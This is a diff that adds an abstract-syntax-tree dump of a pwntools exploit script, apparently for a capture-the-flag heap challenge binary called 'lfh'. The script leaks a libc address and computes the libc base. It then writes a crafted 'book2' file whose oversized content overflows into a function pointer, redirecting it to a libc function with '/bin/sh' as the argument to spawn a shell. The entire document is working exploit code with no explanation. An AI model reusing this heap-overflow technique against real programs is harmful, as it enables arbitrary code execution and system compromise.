@@ -1,0 +1,666 @@
+Module(
+  body=[
+    ImportFrom(
+      module='pwn',
+      names=[
+        alias(name='*')],
+      level=0),
+    Assign(
+      targets=[
+        Name(id='p', ctx=Store())],
+      value=Call(
+        func=Name(id='process', ctx=Load()),
+        args=[
+          List(
+            elts=[
+              Constant(value='/home/angel/lfhsolve/lfh'),
+              Constant(value='/home/angel/lfhsolve/book'),
+              Constant(value='1')],
+            ctx=Load())],
+        keywords=[])),
+    Expr(
+      value=Call(
+        func=Attribute(
+          value=Name(id='p', ctx=Load()),
+          attr='recvuntil',
+          ctx=Load()),
+        args=[
+          Constant(value='this option fortifies your heap from corruption. continue?(y/n)\n')],
+        keywords=[])),
+    Expr(
+      value=Call(
+        func=Attribute(
+          value=Name(id='p', ctx=Load()),
+          attr='sendline',
+          ctx=Load()),
+        args=[
+          Constant(value='y')],
+        keywords=[])),
+    Assign(
+      targets=[
+        Name(id='data', ctx=Store())],
+      value=Call(
+        func=Attribute(
+          value=Name(id='p', ctx=Load()),
+          attr='recvuntil',
+          ctx=Load()),
+        args=[
+          Constant(value='47')],
+        keywords=[])),
+    Assign(
+      targets=[
+        Name(id='data_split', ctx=Store())],
+      value=Call(
+        func=Attribute(
+          value=Name(id='data', ctx=Load()),
+          attr='split',
+          ctx=Load()),
+        args=[
+          Constant(value=b'0x')],
+        keywords=[])),
+    If(
+      test=Compare(
+        left=Call(
+          func=Name(id='len', ctx=Load()),
+          args=[
+            Name(id='data_split', ctx=Load())],
+          keywords=[]),
+        ops=[
+          NotEq()],
+        comparators=[
+          Constant(value=2)]),
+      body=[
+        For(
+          target=Name(id='i', ctx=Store()),
+          iter=Call(
+            func=Name(id='range', ctx=Load()),
+            args=[
+              Constant(value=5)],
+            keywords=[]),
+          body=[
+            Expr(
+              value=Call(
+                func=Name(id='print', ctx=Load()),
+                args=[
+                  Constant(value='FAILED')],
+                keywords=[]))],
+          orelse=[]),
+        Expr(
+          value=Call(
+            func=Name(id='exit', ctx=Load()),
+            args=[],
+            keywords=[]))],
+      orelse=[]),
+    Assign(
+      targets=[
+        Name(id='libc_leak', ctx=Store())],
+      value=Call(
+        func=Name(id='int', ctx=Load()),
+        args=[
+          Subscript(
+            value=Subscript(
+              value=Name(id='data_split', ctx=Load()),
+              slice=Constant(value=1),
+              ctx=Load()),
+            slice=Slice(
+              upper=UnaryOp(
+                op=USub(),
+                operand=Constant(value=3))),
+            ctx=Load()),
+          Constant(value=16)],
+        keywords=[])),
+    Assign(
+      targets=[
+        Name(id='libc_base', ctx=Store())],
+      value=BinOp(
+        left=BinOp(
+          left=Name(id='libc_leak', ctx=Load()),
+          op=Sub(),
+          right=Constant(value=132944)),
+        op=Sub(),
+        right=Constant(value=240))),
+    Expr(
+      value=Call(
+        func=Name(id='print', ctx=Load()),
+        args=[
+          Name(id='libc_base', ctx=Load())],
+        keywords=[])),
+    Assign(
+      targets=[
+        Name(id='f', ctx=Store())],
+      value=Call(
+        func=Name(id='open', ctx=Load()),
+        args=[
+          Constant(value='book2'),
+          Constant(value='wb')],
+        keywords=[])),
+    FunctionDef(
+      name='create_book',
+      args=arguments(
+        posonlyargs=[],
+        args=[
+          arg(arg='signature'),
+          arg(arg='title'),
+          arg(arg='abstract'),
+          arg(arg='fptr'),
+          arg(arg='content_len'),
+          arg(arg='is_unicode'),
+          arg(arg='content'),
+          arg(arg='next')],
+        kwonlyargs=[],
+        kw_defaults=[],
+        defaults=[]),
+      body=[
+        If(
+          test=BoolOp(
+            op=And(),
+            values=[
+              Compare(
+                left=Call(
+                  func=Name(id='len', ctx=Load()),
+                  args=[
+                    Name(id='signature', ctx=Load())],
+                  keywords=[]),
+                ops=[
+                  NotEq()],
+                comparators=[
+                  Constant(value=4)]),
+              Compare(
+                left=Name(id='signature', ctx=Load()),
+                ops=[
+                  NotEq()],
+                comparators=[
+                  Constant(value='BOOK')])]),
+          body=[
+            Expr(
+              value=Call(
+                func=Name(id='print', ctx=Load()),
+                args=[
+                  Constant(value='The signature is wrong')],
+                keywords=[]))],
+          orelse=[]),
+        Return(
+          value=BinOp(
+            left=Name(id='signature', ctx=Load()),
+            op=Add(),
+            right=Call(
+              func=Name(id='create_book_no_signature', ctx=Load()),
+              args=[
+                Name(id='title', ctx=Load()),
+                Name(id='abstract', ctx=Load()),
+                Name(id='fptr', ctx=Load()),
+                Name(id='content_len', ctx=Load()),
+                Name(id='is_unicode', ctx=Load()),
+                Name(id='content', ctx=Load()),
+                Name(id='next', ctx=Load())],
+              keywords=[])))],
+      decorator_list=[]),
+    FunctionDef(
+      name='create_book_no_signature',
+      args=arguments(
+        posonlyargs=[],
+        args=[
+          arg(arg='title'),
+          arg(arg='abstract'),
+          arg(arg='fptr'),
+          arg(arg='content_len'),
+          arg(arg='is_unicode'),
+          arg(arg='content'),
+          arg(arg='next')],
+        kwonlyargs=[],
+        kw_defaults=[],
+        defaults=[]),
+      body=[
+        If(
+          test=Compare(
+            left=BinOp(
+              left=BinOp(
+                left=Constant(value=2),
+                op=Pow(),
+                right=Name(id='is_unicode', ctx=Load())),
+              op=Mult(),
+              right=Name(id='content_len', ctx=Load())),
+            ops=[
+              NotEq()],
+            comparators=[
+              Call(
+                func=Name(id='len', ctx=Load()),
+                args=[
+                  Name(id='content', ctx=Load())],
+                keywords=[])]),
+          body=[
+            Expr(
+              value=Call(
+                func=Name(id='print', ctx=Load()),
+                args=[
+                  Constant(value='The length of the content is wrong')],
+                keywords=[]))],
+          orelse=[]),
+        Expr(
+          value=Call(
+            func=Name(id='print', ctx=Load()),
+            args=[
+              Call(
+                func=Name(id='len', ctx=Load()),
+                args=[
+                  Name(id='content', ctx=Load())],
+                keywords=[])],
+            keywords=[])),
+        Return(
+          value=BinOp(
+            left=Call(
+              func=Name(id='create_book_no_signature_no_content', ctx=Load()),
+              args=[
+                Name(id='title', ctx=Load()),
+                Name(id='abstract', ctx=Load()),
+                Name(id='fptr', ctx=Load()),
+                Name(id='content_len', ctx=Load()),
+                Name(id='is_unicode', ctx=Load()),
+                Name(id='next', ctx=Load())],
+              keywords=[]),
+            op=Add(),
+            right=Name(id='content', ctx=Load())))],
+      decorator_list=[]),
+    FunctionDef(
+      name='create_book_no_signature_no_content',
+      args=arguments(
+        posonlyargs=[],
+        args=[
+          arg(arg='title'),
+          arg(arg='abstract'),
+          arg(arg='fptr'),
+          arg(arg='content_len'),
+          arg(arg='is_unicode'),
+          arg(arg='next')],
+        kwonlyargs=[],
+        kw_defaults=[],
+        defaults=[]),
+      body=[
+        If(
+          test=Compare(
+            left=Call(
+              func=Name(id='len', ctx=Load()),
+              args=[
+                Name(id='title', ctx=Load())],
+              keywords=[]),
+            ops=[
+              NotEq()],
+            comparators=[
+              Constant(value=32)]),
+          body=[
+            Expr(
+              value=Call(
+                func=Name(id='print', ctx=Load()),
+                args=[
+                  Constant(value='The title is wrong')],
+                keywords=[]))],
+          orelse=[
+            If(
+              test=Compare(
+                left=Call(
+                  func=Name(id='len', ctx=Load()),
+                  args=[
+                    Name(id='abstract', ctx=Load())],
+                  keywords=[]),
+                ops=[
+                  NotEq()],
+                comparators=[
+                  Constant(value=256)]),
+              body=[
+                Expr(
+                  value=Call(
+                    func=Name(id='print', ctx=Load()),
+                    args=[
+                      Constant(value='The abstract is wrong')],
+                    keywords=[]))],
+              orelse=[
+                If(
+                  test=Compare(
+                    left=Call(
+                      func=Name(id='len', ctx=Load()),
+                      args=[
+                        Name(id='fptr', ctx=Load())],
+                      keywords=[]),
+                    ops=[
+                      NotEq()],
+                    comparators=[
+                      Constant(value=8)]),
+                  body=[
+                    Expr(
+                      value=Call(
+                        func=Name(id='print', ctx=Load()),
+                        args=[
+                          Constant(value='The fptr is wrong')],
+                        keywords=[]))],
+                  orelse=[
+                    If(
+                      test=Compare(
+                        left=Name(id='content_len', ctx=Load()),
+                        ops=[
+                          Gt()],
+                        comparators=[
+                          Constant(value=8192)]),
+                      body=[
+                        Expr(
+                          value=Call(
+                            func=Name(id='print', ctx=Load()),
+                            args=[
+                              Constant(value='The content is too big')],
+                            keywords=[]))],
+                      orelse=[])])])]),
+        Assign(
+          targets=[
+            Name(id='is_unicode_str', ctx=Store())],
+          value=IfExp(
+            test=Name(id='is_unicode', ctx=Load()),
+            body=Constant(value=b'\x01\x00\x00\x00'),
+            orelse=Constant(value=b'\x00\x00\x00\x00'))),
+        Assign(
+          targets=[
+            Name(id='content_len_str', ctx=Store())],
+          value=Call(
+            func=Name(id='p32', ctx=Load()),
+            args=[
+              Name(id='content_len', ctx=Load())],
+            keywords=[])),
+        Return(
+          value=BinOp(
+            left=BinOp(
+              left=BinOp(
+                left=BinOp(
+                  left=BinOp(
+                    left=BinOp(
+                      left=Name(id='title', ctx=Load()),
+                      op=Add(),
+                      right=Name(id='abstract', ctx=Load())),
+                    op=Add(),
+                    right=Name(id='fptr', ctx=Load())),
+                  op=Add(),
+                  right=Name(id='content_len_str', ctx=Load())),
+                op=Add(),
+                right=Name(id='is_unicode_str', ctx=Load())),
+              op=Add(),
+              right=Call(
+                func=Name(id='p64', ctx=Load()),
+                args=[
+                  Constant(value=0)],
+                keywords=[])),
+            op=Add(),
+            right=Name(id='next', ctx=Load())))],
+      decorator_list=[]),
+    Assign(
+      targets=[
+        Name(id='book_signature', ctx=Store())],
+      value=Constant(value=b'BOOK')),
+    Assign(
+      targets=[
+        Name(id='BOOK_SIZE', ctx=Store())],
+      value=Constant(value=320)),
+    Assign(
+      targets=[
+        Name(id='book', ctx=Store())],
+      value=Call(
+        func=Name(id='create_book', ctx=Load()),
+        args=[
+          Name(id='book_signature', ctx=Load()),
+          BinOp(
+            left=Constant(value=b'A'),
+            op=Mult(),
+            right=Constant(value=32)),
+          BinOp(
+            left=Constant(value=b'B'),
+            op=Mult(),
+            right=Constant(value=256)),
+          BinOp(
+            left=Constant(value=b'C'),
+            op=Mult(),
+            right=Constant(value=8)),
+          Name(id='BOOK_SIZE', ctx=Load()),
+          Constant(value=True),
+          BinOp(
+            left=BinOp(
+              left=Constant(value=b'p'),
+              op=Mult(),
+              right=Name(id='BOOK_SIZE', ctx=Load())),
+            op=Mult(),
+            right=Constant(value=2)),
+          BinOp(
+            left=Constant(value=b'E'),
+            op=Mult(),
+            right=Constant(value=8))],
+        keywords=[])),
+    Assign(
+      targets=[
+        Name(id='book', ctx=Store())],
+      value=Call(
+        func=Name(id='create_book', ctx=Load()),
+        args=[
+          Name(id='book_signature', ctx=Load()),
+          BinOp(
+            left=Constant(value=b'A'),
+            op=Mult(),
+            right=Constant(value=32)),
+          BinOp(
+            left=Constant(value=b'B'),
+            op=Mult(),
+            right=Constant(value=256)),
+          BinOp(
+            left=Constant(value=b'C'),
+            op=Mult(),
+            right=Constant(value=8)),
+          Name(id='BOOK_SIZE', ctx=Load()),
+          Constant(value=True),
+          BinOp(
+            left=BinOp(
+              left=Constant(value=b'p'),
+              op=Mult(),
+              right=Name(id='BOOK_SIZE', ctx=Load())),
+            op=Mult(),
+            right=Constant(value=2)),
+          BinOp(
+            left=Constant(value=b'E'),
+            op=Mult(),
+            right=Constant(value=8))],
+        keywords=[])),
+    Expr(
+      value=Call(
+        func=Attribute(
+          value=Name(id='f', ctx=Load()),
+          attr='write',
+          ctx=Load()),
+        args=[
+          Name(id='book', ctx=Load())],
+        keywords=[])),
+    For(
+      target=Name(id='i', ctx=Store()),
+      iter=Call(
+        func=Name(id='range', ctx=Load()),
+        args=[
+          Constant(value=44)],
+        keywords=[]),
+      body=[
+        Assign(
+          targets=[
+            Name(id='book', ctx=Store())],
+          value=Call(
+            func=Name(id='create_book_no_signature', ctx=Load()),
+            args=[
+              BinOp(
+                left=Constant(value=b'A'),
+                op=Mult(),
+                right=Constant(value=32)),
+              BinOp(
+                left=Constant(value=b'B'),
+                op=Mult(),
+                right=Constant(value=256)),
+              BinOp(
+                left=Constant(value=b'C'),
+                op=Mult(),
+                right=Constant(value=8)),
+              Name(id='BOOK_SIZE', ctx=Load()),
+              Constant(value=False),
+              BinOp(
+                left=Constant(value=b'p'),
+                op=Mult(),
+                right=Name(id='BOOK_SIZE', ctx=Load())),
+              BinOp(
+                left=Constant(value=b'E'),
+                op=Mult(),
+                right=Constant(value=8))],
+            keywords=[])),
+        Expr(
+          value=Call(
+            func=Attribute(
+              value=Name(id='f', ctx=Load()),
+              attr='write',
+              ctx=Load()),
+            args=[
+              Name(id='book', ctx=Load())],
+            keywords=[]))],
+      orelse=[]),
+    FunctionDef(
+      name='create_book_win',
+      args=arguments(
+        posonlyargs=[],
+        args=[
+          arg(arg='addr'),
+          arg(arg='book_size')],
+        kwonlyargs=[],
+        kw_defaults=[],
+        defaults=[]),
+      body=[
+        Expr(
+          value=Call(
+            func=Name(id='print', ctx=Load()),
+            args=[
+              Call(
+                func=Name(id='p64', ctx=Load()),
+                args=[
+                  Name(id='addr', ctx=Load())],
+                keywords=[])],
+            keywords=[])),
+        Expr(
+          value=Call(
+            func=Name(id='print', ctx=Load()),
+            args=[
+              Subscript(
+                value=Call(
+                  func=Name(id='repr', ctx=Load()),
+                  args=[
+                    Call(
+                      func=Name(id='p64', ctx=Load()),
+                      args=[
+                        Name(id='addr', ctx=Load())],
+                      keywords=[])],
+                  keywords=[]),
+                slice=Slice(
+                  lower=Constant(value=2),
+                  upper=UnaryOp(
+                    op=USub(),
+                    operand=Constant(value=1))),
+                ctx=Load())],
+            keywords=[])),
+        Return(
+          value=BinOp(
+            left=BinOp(
+              left=BinOp(
+                left=BinOp(
+                  left=BinOp(
+                    left=BinOp(
+                      left=BinOp(
+                        left=BinOp(
+                          left=BinOp(
+                            left=Constant(value=b'A'),
+                            op=Mult(),
+                            right=Constant(value=16)),
+                          op=Add(),
+                          right=Constant(value=b'/bin/sh\x00')),
+                        op=Add(),
+                        right=BinOp(
+                          left=Constant(value=b'\x00'),
+                          op=Mult(),
+                          right=Constant(value=8))),
+                      op=Add(),
+                      right=BinOp(
+                        left=Constant(value=b'\x00'),
+                        op=Mult(),
+                        right=Constant(value=256))),
+                    op=Add(),
+                    right=BinOp(
+                      left=Constant(value=b'\x00'),
+                      op=Mult(),
+                      right=Constant(value=8))),
+                  op=Add(),
+                  right=Call(
+                    func=Name(id='p32', ctx=Load()),
+                    args=[
+                      Name(id='book_size', ctx=Load())],
+                    keywords=[])),
+                op=Add(),
+                right=Constant(value=b'\x01\x00\x00\x00')),
+              op=Add(),
+              right=Call(
+                func=Name(id='p64', ctx=Load()),
+                args=[
+                  Name(id='addr', ctx=Load())],
+                keywords=[])),
+            op=Add(),
+            right=BinOp(
+              left=Constant(value=b'E'),
+              op=Mult(),
+              right=Constant(value=8))))],
+      decorator_list=[]),
+    Assign(
+      targets=[
+        Name(id='win_book', ctx=Store())],
+      value=Call(
+        func=Name(id='create_book_win', ctx=Load()),
+        args=[
+          BinOp(
+            left=Name(id='libc_base', ctx=Load()),
+            op=Add(),
+            right=Constant(value=283552)),
+          Constant(value=320)],
+        keywords=[])),
+    Assign(
+      targets=[
+        Name(id='book', ctx=Store())],
+      value=Call(
+        func=Name(id='create_book_no_signature', ctx=Load()),
+        args=[
+          BinOp(
+            left=Constant(value=b'A'),
+            op=Mult(),
+            right=Constant(value=32)),
+          BinOp(
+            left=Constant(value=b'B'),
+            op=Mult(),
+            right=Constant(value=256)),
+          BinOp(
+            left=Constant(value=b'C'),
+            op=Mult(),
+            right=Constant(value=8)),
+          Name(id='BOOK_SIZE', ctx=Load()),
+          Constant(value=True),
+          BinOp(
+            left=BinOp(
+              left=Constant(value=b'p'),
+              op=Mult(),
+              right=Name(id='BOOK_SIZE', ctx=Load())),
+            op=Add(),
+            right=Name(id='win_book', ctx=Load())),
+          BinOp(
+            left=Constant(value=b'E'),
+            op=Mult(),
+            right=Constant(value=8))],
+        keywords=[])),
+    Expr(
+      value=Call(
+        func=Attribute(
+          value=Name(id='f', ctx=Load()),
+          attr='write',
+          ctx=Load()),
+        args=[
+          Name(id='book', ctx=Load())],
+        keywords=[]))],
+  type_ignores=[])
